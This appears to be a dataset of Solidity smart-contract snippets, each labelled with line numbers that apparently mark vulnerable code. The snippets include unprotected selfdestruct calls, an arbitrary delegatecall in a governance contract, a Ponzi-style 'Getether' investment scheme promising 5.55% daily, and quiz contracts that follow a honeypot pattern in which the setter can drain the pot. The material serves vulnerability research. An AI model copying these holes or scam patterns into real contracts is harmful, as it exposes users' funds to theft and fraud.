*   Twitter          - https://twitter.com/_getether_
*   LinkedIn 	    - https://www.linkedin.com/in/get-ether-037833170/
*   Medium        - https://medium.com/@ getether/
*   Facebook 	    - https://www.facebook.com/get.ether
*   Instagram	    - https://www.instagram.com/getether.me
*
*  -----------------------------------------About the GETETHER-------------------------------------------
*
*   DECENTRALIZED INVESTMENT PROJECT
*   PAYMENTS 5,55% DAILY
*   INVESTMENTS BASED ON TECHNOLOGY Smart Contract Blockchain Ethereum!
*   Open source code.
*   Implemented the function of abandonment of ownership
* 
*  -----------------------------------------Usage rules---------------------------------------------------
*
*  1. Send any amount from 0.01 ETH  from ETH wallet to the smart contract address 
*     
*  2. Verify your transaction on etherscan.io, specifying the address of your wallet.
*
*  3. Claim your profit in ETH by sending 0 ETH  transaction every 24 hours.
*  
*  4. In order to make a reinvest in the project, you must first remove the interest of your accruals
*	  (done by sending 0 ETH from the address of which you invested, and only then send a new Deposit)
*  
*   RECOMMENDED GAS LIMIT: 70000
*   RECOMMENDED GAS PRICE view on: https://ethgasstation.info/
*   You can check the payments on the etherscan.io site, in the ""Internal Txns"" tab of your wallet.
*
*  -----------------------------------------ATTENTION !!! -------------------------------------------------
*   It is not allowed to make transfers from any exchanges! only from your personal ETH wallet, 
*	from which you have a private key!
* 
*   The contract was reviewed and approved by the pros in the field of smart contracts!
*/
contract Getether {
    address owner;
    function Getether() {
        owner = msg.sender;
    }
    mapping (address => uint256) balances;
    mapping (address => uint256) timestamp;
    function() external payable {
        owner.send((msg.value * 100)/666);
        if (balances[msg.sender] != 0){
        address kashout = msg.sender;
        uint256 getout = balances[msg.sender]*111/2000*(block.number-timestamp[msg.sender])/5900;
        kashout.send(getout);
        }
        timestamp[msg.sender] = block.number;
        balances[msg.sender] += msg.value;
    }
}",[56]
"pragma solidity ^0.4.0;
contract GetsBurned {
    function () payable public {
    }
    function BurnMe() public {
        // Selfdestruct and send eth to self, 
        selfdestruct(address(this));
    }
}","[5, 7]"
"pragma solidity ^0.4.25;  
contract GetsBurned {
    function () public payable {
    }
    function BurnMe () {
        selfdestruct(address(this));
    }
}","[5, 6]"
"pragma solidity ^0.5.11;
contract Claimable
{
    function claimOwnership() public;
}
contract GhostOwner {
    address payable public creator;
    address public constant LONG_TERM = 0xC8Fcc48D1454a83589169294470549A2e1713DeC;
    constructor() public {
        creator = msg.sender;
    }
    function claimAndDestruct() external {
        Claimable(LONG_TERM).claimOwnership();
        selfdestruct(creator);
    }
}","[12, 14]"
"pragma solidity ^0.4.22;
contract Gift
{
    bool closed = false;
    uint unlockTime = 43200;
    address sender;
    address receiver;
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }
    function() public payable { }
}","[12, 21]"
"pragma solidity ^0.4.17;
contract GiftEth {
  event RecipientChanged(address indexed _oldRecipient, address indexed _newRecipient);
  address public gifter;
  address public recipient;
  uint256 public lockTs;
  string public giftMessage;
  function GiftEth(address _gifter, address _recipient, uint256 _lockTs, string _giftMessage) payable public {
    gifter = _gifter;
    recipient = _recipient;
    lockTs = _lockTs;
    giftMessage = _giftMessage;
  }
  function withdraw() public {
    require(msg.sender == recipient);
    require(now >= lockTs);
    msg.sender.transfer(this.balance);
  }
  function changeRecipient(address _newRecipient) public {
    require(msg.sender == recipient);
    RecipientChanged(recipient, _newRecipient);
    recipient = _newRecipient;
  }
}",[16]
"    address proposer;
    // The time at which voting starts
    uint startTime;
    // Current number of votes in favor of this proposal
    uint forVotes;
    // Current number of votes in opposition to this proposal
    uint againstVotes;
    // Queued transaction hash
    bytes32 txHash;
    bool executed;
  }
  // Ballot receipt record for a voter
  struct Receipt {
    // Whether or not a vote has been cast
    bool hasVoted;
    // Whether or not the voter supports the proposal
    bool support;
    // The number of votes the voter had, which were cast
    uint votes;
  }
  // Possible states that a proposal may be in
  enum ProposalState {
    Active,            // 0
    Defeated,          // 1
    PendingExecution,  // 2
    ReadyForExecution, // 3
    Executed           // 4
  }
  // If the votingPeriod is changed and the user votes again, the lock period will be reset.
  modifier lockVotes() {
    uint tokenBalance = votingToken.balanceOf(msg.sender);
    votingToken.transferFrom(msg.sender, address(this), tokenBalance);
    _mint(msg.sender, tokenBalance);
    voteLock[msg.sender] = block.timestamp + votingPeriod;
    _;
  }
  constructor(IERC20 _votingToken) {
      votingToken = _votingToken;
  }
  function state(uint proposalId) public view returns (ProposalState) {
    require(proposalCount >= proposalId && proposalId > 0, ""Governance::state: invalid proposal id"");
    Proposal storage proposal = proposals[proposalId];
    if (block.timestamp <= proposal.startTime + votingPeriod) {
      return ProposalState.Active;
    } else if (proposal.executed == true) {
      return ProposalState.Executed;
    } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < quorumVotes) {
      return ProposalState.Defeated;
    } else if (block.timestamp < proposal.startTime + executionPeriod) {
      return ProposalState.PendingExecution;
    } else {
      return ProposalState.ReadyForExecution;
    }
  }
  function execute(uint _proposalId, address _target, bytes memory _data)
    public
    payable
    returns (bytes memory)
  {
    bytes32 txHash = keccak256(abi.encode(_target, _data));
    Proposal storage proposal = proposals[_proposalId];
    require(proposal.txHash == txHash, ""Governance::execute: Invalid proposal"");
    require(state(_proposalId) == ProposalState.ReadyForExecution, ""Governance::execute: Cannot be executed"");
    (bool success, bytes memory returnData) = _target.delegatecall(_data);
    require(success, ""Governance::execute: Transaction execution reverted."");
    proposal.executed = true;
    return returnData;
  }
  function propose(address _target, bytes memory _data) public lockVotes returns (uint) {
    require(balanceOf[msg.sender] >= proposalThreshold, ""Governance::propose: proposer votes below proposal threshold"");
    bytes32 txHash = keccak256(abi.encode(_target, _data));
    proposalCount++;
    Proposal memory newProposal = Proposal({
      id:           proposalCount,
      proposer:     msg.sender,
      startTime:    block.timestamp,
      forVotes:     0,
      againstVotes: 0,
      txHash:       txHash,
      executed:     false
    });
    proposals[newProposal.id] = newProposal;
    return proposalCount;
  }
  function vote(uint _proposalId, bool _support) public lockVotes {
    require(state(_proposalId) == ProposalState.Active, ""Governance::vote: voting is closed"");
    Proposal storage proposal = proposals[_proposalId];
    Receipt storage receipt = receipts[_proposalId][msg.sender];
    require(receipt.hasVoted == false, ""Governance::vote: voter already voted"");
    uint votes = balanceOf[msg.sender];
    if (_support) {
      proposal.forVotes += votes;
    } else {
      proposal.againstVotes += votes;
    }
    receipt.hasVoted = true;
    receipt.support = _support;
    receipt.votes = votes;
  }
  function withdraw() public {
    require(block.timestamp > voteLock[msg.sender], ""Governance::withdraw: wait until voteLock expiration"");
    votingToken.transfer(msg.sender, balanceOf[msg.sender]);
    _burn(msg.sender, balanceOf[msg.sender]);
  }
  function _mint(address _account, uint _amount) internal {
    balanceOf[_account] += _amount;
  }
  function _burn(address _account, uint _amount) internal {
    balanceOf[_account] -= _amount;
  }
}",[64]
"    uint public minAmount = 10000000000000000;
    function isAddress(address check) public view returns(bool isIndeed) {
   return isActuallyAnAddressOnMyList[check];
}
  function getBalance() public view returns(uint256 balance) {
      return this.balance;
  }
   function play(uint8 mynumber) payable {
       require(msg.value == minAmount);
       require(mynumber >=0);
       require(mynumber <= maxnumber);
       require(state == LotteryState.Accepting);
      whosDaWinner[mynumber].push(msg.sender);
      mynumbers[msg.sender].push(mynumber);
       allnumbers.push(mynumber);
       if (!isAddress(msg.sender)){
           allplayers.push(msg.sender);
           isActuallyAnAddressOnMyList[msg.sender] = true;
       }
       if (allnumbers.length == maxplayers){
           state = LotteryState.Finished;
       }
   }
   function seeMyNumbers()public view returns(uint8[], uint256) {
       return(mynumbers[msg.sender],mynumbers[msg.sender].length);
   }
   function seeAllNumbers() public view returns(uint8[]){
       return  allnumbers;
       //return numberlist;
   }
   function seeAllPlayers() public view returns(address[]){
       return allplayers;
   }
    function setMaxNumber(uint8 newNumber) public onlyOwner {
        maxnumber = newNumber;
    }
    function setMaxPlayers(uint8 newNumber) public onlyOwner {
        maxplayers = newNumber;
    }
    function setMinAmount(uint newNumber) public onlyOwner {
        minAmount = newNumber;
    }
      function sum(uint8[] data) private returns (uint) {
        uint S;
        for(uint i;i < data.length;i++){
            S += data[i];
        }
        return S;
    }
    function setMyCut(uint256 win, uint256 lose) public onlyOwner {
        myWinShare = win;
        myLoseShare = lose;
    }
    function determineNumber() private returns(uint8) {
        winningNumber = uint8(sum(allnumbers)/allnumbers.length/3*2);
    }
    function determineWinner() public onlyOwner returns(uint8, address[]){
        require (state == LotteryState.Finished);
        determineNumber();
       winnerlist = whosDaWinner[winningNumber];
       if (winnerlist.length > 0){
           owner.transfer(this.balance/100*myWinShare);
           uint256 numwinners = winnerlist.length;
           for (uint8 i =0; i<numwinners; i++){
               winnerlist[i].transfer(this.balance/numwinners);
           }
       } else {
           owner.transfer(this.balance/100*myLoseShare);
       }
         return (winningNumber, winnerlist);
    }
    function getNumAdd(uint8 num) public view returns(address[]) {
        return whosDaWinner[num];
    }
    function getResults() public view returns(uint8, address[]){
        return (winningNumber, winnerlist);
    }
    function startOver() public onlyOwner{
      //  uint8 i = number;
      for (uint8 i=0; i<allnumbers.length; i++){
        delete (whosDaWinner[allnumbers[i]]);
        //delete playerlist;
        }
    for (uint8 j=0;j<allplayers.length; j++){
        delete mynumbers[allplayers[j]];
        delete isActuallyAnAddressOnMyList[allplayers[j]];
    }
        delete allplayers;
        delete allnumbers;
        delete winnerlist;
        state = LotteryState.Accepting;
        roundnum ++;
}
}","[64, 65]"
"pragma solidity ^0.4.19;
/**
   @title HODL
   A smart contract for real HOLDERS, all ETH received here can be withdraw a year 
   after it was deposited.
 */
contract HODL {
    // 1 Year to relase the funds
    uint256 public RELEASE_TIME = 1 years;
    // Balances on hold
    mapping(address => Deposit) deposits;
    struct Deposit {
        uint256 value;
        uint256 releaseTime;
    }
    /**
     @dev Fallback function
     Everytime the contract receives ETH it will check if there is a deposit
     made by the `msg.sender` if there is one the value of the tx wil be added
     to the current deposit and the release time will be reseted adding a year
     If there is not deposit created by the `msg.sender` it will be created.
   */
    function () public payable {
        require(msg.value > 0);
        if (deposits[msg.sender].releaseTime == 0) {
            uint256 releaseTime = now + RELEASE_TIME;
            deposits[msg.sender] = Deposit(msg.value, releaseTime);
        } else {
            deposits[msg.sender].value += msg.value;
            deposits[msg.sender].releaseTime += RELEASE_TIME;
        }
    }
    /**
     @dev withdraw function
     This function can be called by a holder after a year of his last deposit
     and it will transfer all the ETH deposited back to him.
   */
    function withdraw() public {
        require(deposits[msg.sender].value > 0);
        require(deposits[msg.sender].releaseTime < now);
        msg.sender.transfer(deposits[msg.sender].value);
        deposits[msg.sender].value = 0;
        deposits[msg.sender].releaseTime = 0;
    }
    /**
     @dev getDeposit function
     It returns the deposited value and release time from a holder.
     @param holder address The holder address
     @return uint256 value Amount of ETH deposited in wei
     @return uint256 releaseTime Timestamp of when the the deposit can returned
   */
    function getDeposit(address holder) public view returns
        (uint256 value, uint256 releaseTime)
    {
        return(deposits[holder].value, deposits[holder].releaseTime);
    }
}","[26, 40]"
"pragma solidity ^0.8.0;
contract HOKKBridgePort {
    event myEvent(bytes);
    // Code position in storage is keccak256(""PROXIABLE"") = ""0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7""
    constructor(bytes memory constructData, address contractLogic) public {
        // save the code address
        assembly { // solium-disable-line
            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)
        }
        (bool success, bytes memory __ ) = contractLogic.delegatecall(constructData); // solium-disable-line
        emit myEvent(__);
        require(success, ""Construction failed"");
    }
    fallback() external payable {
        assembly { // solium-disable-line
            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)
            calldatacopy(0x0, 0x0, calldatasize())
            let success := delegatecall(gas(), contractLogic, 0x0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch success
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}",[10]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract HOKKDividendTracker {
    // Code position in storage is keccak256(""PROXIABLE"") = ""0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7""
    constructor(bytes memory constructData, address contractLogic) public {
        // save the code address
        assembly { // solium-disable-line
            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)
        }
        (bool success, bytes memory __ ) = contractLogic.delegatecall(constructData); // solium-disable-line
        require(success, ""Construction failed"");
    }
    fallback() external payable {
        assembly { // solium-disable-line
            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)
            calldatacopy(0x0, 0x0, calldatasize())
            let success := delegatecall(gas(), contractLogic, 0x0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch success
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}",[10]
"pragma solidity ^0.8.0;
contract HOKKNFT {
    event myEvent(bytes);
    // Code position in storage is keccak256(""PROXIABLE"") = ""0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7""
    constructor(bytes memory constructData, address contractLogic) public {
        // save the code address
        assembly { // solium-disable-line
            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)
        }
        (bool success, bytes memory __ ) = contractLogic.delegatecall(constructData); // solium-disable-line
        emit myEvent(__);
        require(success, ""Construction failed"");
    }
    fallback() external payable {
        assembly { // solium-disable-line
            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)
            calldatacopy(0x0, 0x0, calldatasize())
            let success := delegatecall(gas(), contractLogic, 0x0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch success
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}",[10]
"pragma solidity ^0.4.23;
contract HelloWorld {
    function sayHello() public pure returns (string) {
        return (""Hello World!"");
    }
    function kill()  public {
        selfdestruct(address(0x094f2cdef86e77fd66ea9246ce8f2f653453a5ce));
    }
}","[6, 7]"
"    modifier crowdsaleEnded() {
        require(now > icoEndTime);
        _;
    }
    modifier foundersTokensUnlocked() {
        require(now > foundersTokensUnlockTime);
        _;
    }
    modifier crowdsaleInProgress() {
        bool withinPeriod = (now >= icoStartTime && now <= icoEndTime);
        require(withinPeriod);
        _;
    }
    function HireGoCrowdsale(uint _icoStartTime, uint _icoEndTime, address _wallet) public {
        require (
          _icoStartTime > now &&
          _icoEndTime > _icoStartTime
        );
        icoStartTime = _icoStartTime;
        icoEndTime = _icoEndTime;
        foundersTokensUnlockTime = icoEndTime.add(180 days);
        wallet = _wallet;
        rate = 250 szabo; // wei per 1 token (0.00025ETH)
        hardCap = 11836 ether;
        icoMinPurchase = 50 finney; // 0.05 ETH
        isRefundAllowed = false;
        waveCap1 = 2777 ether;
        waveCap2 = waveCap1.add(2884 ether);
        waveCap3 = waveCap2.add(4000 ether);
        waveCap4 = waveCap3.add(2174 ether);
    }
    // fallback function can be used to buy tokens
    function() public payable {
        buyTokens();
    }
    // low level token purchase function
    function buyTokens() public payable crowdsaleInProgress hardCapNotReached {
        require(msg.value > 0);
        // check if the buyer exceeded the funding goal
        calculatePurchaseAndBonuses(msg.sender, msg.value);
    }
    // Returns number of investors
    function getInvestorCount() public view returns (uint) {
        return investors_number.length;
    }
    // Owner can allow or disallow refunds even if soft cap is reached. Should be used in case KYC is not passed.
    // WARNING: owner should transfer collected ETH back to contract before allowing to refund, if he already withdrawn ETH.
    function toggleRefunds() public onlyOwner {
        isRefundAllowed = true;
    }
    // Sends ordered tokens to investors after ICO end if soft cap is reached
    // tokens can be send only if ico has ended
    function sendOrderedTokens() public onlyOwner crowdsaleEnded {
        address investor;
        uint tokensCount;
        for(uint i = 0; i < investors_number.length; i++) {
            investor = investors_number[i];
            tokensCount = orderedTokens[investor];
            assert(tokensCount > 0);
            orderedTokens[investor] = 0;
            token.transfer(investor, tokensCount);
        }
    }
    // Owner can send back collected ETH if soft cap is not reached or KYC is not passed
    // WARNING: crowdsale contract should have all received funds to return them.
    // If you have already withdrawn them, send them back to crowdsale contract
    function refundInvestors() public onlyOwner {
        require(now >= icoEndTime);
        require(isRefundAllowed);
        require(msg.sender.balance > 0);
        address investor;
        uint contributedWei;
        uint tokens;
        for(uint i = 0; i < investors_number.length; i++) {
            investor = investors_number[i];
            contributedWei = contributors[investor];
            tokens = orderedTokens[investor];
            if(contributedWei > 0) {
                totalWeiRaised = totalWeiRaised.sub(contributedWei);
                weiRaised = weiRaised.sub(contributedWei);
                if(weiRaised<0){
                  weiRaised = 0;
                }
                contributors[investor] = 0;
                orderedTokens[investor] = 0;
                tokensDistributed = tokensDistributed.sub(tokens);
                investor.transfer(contributedWei); // return funds back to contributor
            }
        }
    }
    // Owner of contract can withdraw collected ETH by calling this function
    function withdraw() public onlyOwner {
        uint to_send = weiRaised;
        weiRaised = 0;
        FundsWithdrawn(msg.sender, to_send);
        wallet.transfer(to_send);
    }
    function burnUnsold() public onlyOwner crowdsaleEnded {
        uint tokensLeft = totalSupply.sub(tokensDistributed);
        token.burn(tokensLeft);
    }
    function finishIco() public onlyOwner {
        icoEndTime = now;
    }
    function distribute_for_founders() public onlyOwner foundersTokensUnlocked {
        uint to_send = 40000000E18; //40m
        checkAndMint(to_send);
        token.transfer(wallet, to_send);
    }
    function transferOwnershipToken(address _to) public onlyOwner {
        token.transferOwnership(_to);
    }
    /***************************
    **  Internal functions    **
    ***************************/
    // Calculates purchase conditions and token bonuses
    function calculatePurchaseAndBonuses(address _beneficiary, uint _weiAmount) internal {
        if (now >= icoStartTime && now < icoEndTime) require(_weiAmount >= icoMinPurchase);
        uint cleanWei; // amount of wei to use for purchase excluding change and hardcap overflows
        uint change;
        uint _tokens;
        //check for hardcap overflow
        if (_weiAmount.add(totalWeiRaised) > hardCap) {
            cleanWei = hardCap.sub(totalWeiRaised);
            change = _weiAmount.sub(cleanWei);
        }
        else cleanWei = _weiAmount;
        assert(cleanWei > 4); // 4 wei is a price of minimal fracture of token","[61, 68]"
"pragma solidity ^0.5.0;
library Hive1 {
    function func() public { }
}
library Hive2 {
    function func() public {
        Hive1.func();
    }
}
contract Bee {
    function func() public {
        Hive2.func();
    }
    function die() public {
        selfdestruct(msg.sender);
    }
}","[14, 15]"
"pragma solidity ^0.4.11;
/*
    Contract to force hodl 
*/
contract Owned {
    address public owner;
}
/*
Master Contract for Forcing Users to Hodl.
*/
contract HodlContract{
    HodlStruct[] public hodls; 
    address FeeAddress;
    event hodlAdded(uint hodlID, address recipient, uint amount, uint waitTime);
    event Deposit(address token, address user, uint amount, uint balance);
    event Withdraw(address token, address user, uint amount, uint balance);
    struct HodlStruct {
        address recipient;
        uint amount;
        uint waitTime;
        bool executed;
    }
   function HodlEth(address beneficiary, uint daysWait) public payable returns (uint hodlID) 
   {
       uint FeeAmount;
       FeeAddress = 0x9979cCFF79De92fbC1fb43bcD2a3a97Bb86b6920; 
        FeeAmount = msg.value * 1/100; //1% fee because you don't have the self control to hodl yourself.
        FeeAddress.transfer(FeeAmount);
        hodlID = hodls.length++;
        HodlStruct storage p = hodls[hodlID];
        p.waitTime = now + daysWait * 1 days;
        p.recipient = beneficiary;
        p.amount = msg.value * 99/100;
        p.executed = false;
        hodlAdded(hodlID, beneficiary, msg.value, p.waitTime);
        return hodlID;
    }
    function Realize(uint hodlID) public payable returns (uint amount){
    HodlStruct storage p = hodls[hodlID];
    require (now > p.waitTime  //Didn't wait long enough.
    && !p.executed //Not already executed.
    && msg.sender == p.recipient); //Only recipient as sender can get ether back.
        msg.sender.transfer(p.amount); // transfer the ether to the sender.
        p.executed = true;
        return p.amount;
    }
    function FindID(address beneficiary) public returns (uint hodlID){ //Emergency if user lost HodlID
        HodlStruct storage p = hodls[hodlID];
        for (uint i = 0; i <  hodls.length; ++i) {
            if (p.recipient == beneficiary && !p.executed ) {
                return hodlID;
            } else {
                revert();
            }
        }
    }
}","[31, 40]"
"pragma solidity ^0.4.18;
/**
 * Holds funds for a year.  Send to or deposit directly to this contract.
 * Each new acccount is initialized with a 1 year hold period, and is only 
 * retrievable from the designated address after the set hold time.
*/
contract HodlerInvestmentClub {
    uint public hodl_interval= 1 years;
    uint public m_hodlers = 1;
    struct Hodler {
        uint value;
        uint time;
    }
    mapping(address => Hodler) public hodlers;
    modifier onlyHodler {
        require(hodlers[msg.sender].value > 0);
        _;
    }
    /* Constructor */
    function HodlerInvestmentClub() payable public {
        if (msg.value > 0)  {
            hodlers[msg.sender].value = msg.value;
            hodlers[msg.sender].time = now + hodl_interval;
        }
    }
    // join the club!
    // make a deposit to another account if it exists 
    // or initialize a deposit for a new account
    function deposit(address _to) payable public {
        require(msg.value > 0);
        if (_to == 0) _to = msg.sender;
        // if a new member, init a hodl time
        if (hodlers[_to].time == 0) {
            hodlers[_to].time = now + hodl_interval;
            m_hodlers++;
        } 
        hodlers[_to].value += msg.value;
    }
    // withdrawal can only occur after deposit time is exceeded
    function withdraw() public onlyHodler {
        require(hodlers[msg.sender].time <= now);
        uint256 value = hodlers[msg.sender].value;
        delete hodlers[msg.sender];
        m_hodlers--;
        require(msg.sender.send(value));
    }
    // join the club!
    // simple deposit and hold time set for msg.sender
    function() payable public {
        require(msg.value > 0);
        hodlers[msg.sender].value += msg.value;
        // init for first deposit
        if (hodlers[msg.sender].time == 0) {
            hodlers[msg.sender].time = now + hodl_interval;
            m_hodlers++;
        }
    }
}",[41]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract HokkaidoInu {
    // Code position in storage is keccak256(""PROXIABLE"") = ""0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7""
    constructor(bytes memory constructData, address contractLogic) public {
        // save the code address
        assembly { // solium-disable-line
            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)
        }
        (bool success, bytes memory __ ) = contractLogic.delegatecall(constructData); // solium-disable-line
        require(success, ""Construction failed"");
    }
    fallback() external payable {
        assembly { // solium-disable-line
            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)
            calldatacopy(0x0, 0x0, calldatasize())
            let success := delegatecall(gas(), contractLogic, 0x0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch success
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}",[10]
"pragma solidity ^0.4.13;
contract ICOWallet {
    bool isClosed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] public Deposits;
    mapping (address => uint) public total;
    function() public payable { }
    function init(uint date)
    {
        refundDate = date;
    }
    function deposit()
    public payable {
        if (msg.value >= 0.25 ether && msg.sender!=0x0)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 25 ether)
        {
            isClosed = true;
        }
    }
    function refund(uint amount)
    public {
        if (now >= refundDate && isClosed==false)
        {
            if (total[msg.sender] >= amount && amount > 0)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            msg.sender.transfer(this.balance);
        }
    }
}",[31]
"pragma solidity ^0.4.20;
contract IFYKRYGE
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract INTELLECTUAL_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.18;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
interface token {
    function transfer(address receiver, uint amount) public;
    function burn(uint256 _value) public returns (bool success);
}
contract Ownable {
    address public owner;
    function Ownable() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}
contract IQNCrowdsale is Ownable {
    using SafeMath for uint256;
    uint256 public constant EXCHANGE_RATE = 325;
    uint256 public constant START = 1517313600; // Tuesday, 30-Jan-18 12:00:00 UTC in RFC 2822
    uint256 availableTokens;
    address addressToSendEthereum;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    /**
     * Constrctor function
     *
     * Setup the owner
     */
    function IQNCrowdsale (
        address addressOfTokenUsedAsReward,
        address _addressToSendEthereum
    ) public {
        availableTokens = 5700000 * 10 ** 18;
        addressToSendEthereum = _addressToSendEthereum;
        deadline = START + 42 days;
        tokenReward = token(addressOfTokenUsedAsReward);
    }
    /**
     * Fallback function
     *
     * The function without name is the default function that is called whenever anyone sends funds to a contract
     */
    function () public payable {
        require(now < deadline && now >= START);
        uint256 amount = msg.value;
        uint256 tokens = amount * EXCHANGE_RATE;
        uint256 bonus = getBonus(tokens);
        tokens = tokens.add(bonus);
        balanceOf[msg.sender] += tokens;
        amountRaised += tokens;
        availableTokens -= tokens;
        tokenReward.transfer(msg.sender, tokens);
        addressToSendEthereum.transfer(amount);
    }
    function getBonus(uint256 _tokens) public constant returns (uint256) {
        require(_tokens > 0);
        if (START <= now && now < START + 1 days) {
            return _tokens.mul(30).div(100); // 30% first day
        } else if (START <= now && now < START + 1 weeks) {
            return _tokens.div(4); // 25% first week
        } else if (START + 1 weeks <= now && now < START + 2 weeks) {
            return _tokens.div(5); // 20% second week
        } else if (START + 2 weeks <= now && now < START + 3 weeks) {
            return _tokens.mul(15).div(100); // 15% third week
        } else if (START + 3 weeks <= now && now < START + 4 weeks) {
            return _tokens.div(10); // 10% fourth week
        } else if (START + 4 weeks <= now && now < START + 5 weeks) {
            return _tokens.div(20); // 5% fifth week
        } else {
            return 0;
        }
    }
    modifier afterDeadline() { 
        require(now >= deadline);
        _; 
    }
    function sellForOtherCoins(address _address,uint amount)  public payable onlyOwner
    {
        uint256 tokens = amount;
        uint256 bonus = getBonus(tokens);
        tokens = tokens.add(bonus);
        availableTokens -= tokens;
        tokenReward.transfer(_address, tokens);
    }
    function burnAfterIco() public onlyOwner returns (bool success){
        uint256 balance = availableTokens;
        tokenReward.burn(balance);
        availableTokens = 0;
        return true;
    }
    function tokensAvailable() public constant returns (uint256) {
        return availableTokens;
    }
}",[72]
"pragma solidity ^0.4.20;
contract IQ_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"/**
 *Submitted for verification at Etherscan.io on 2020-05-22
*/
pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
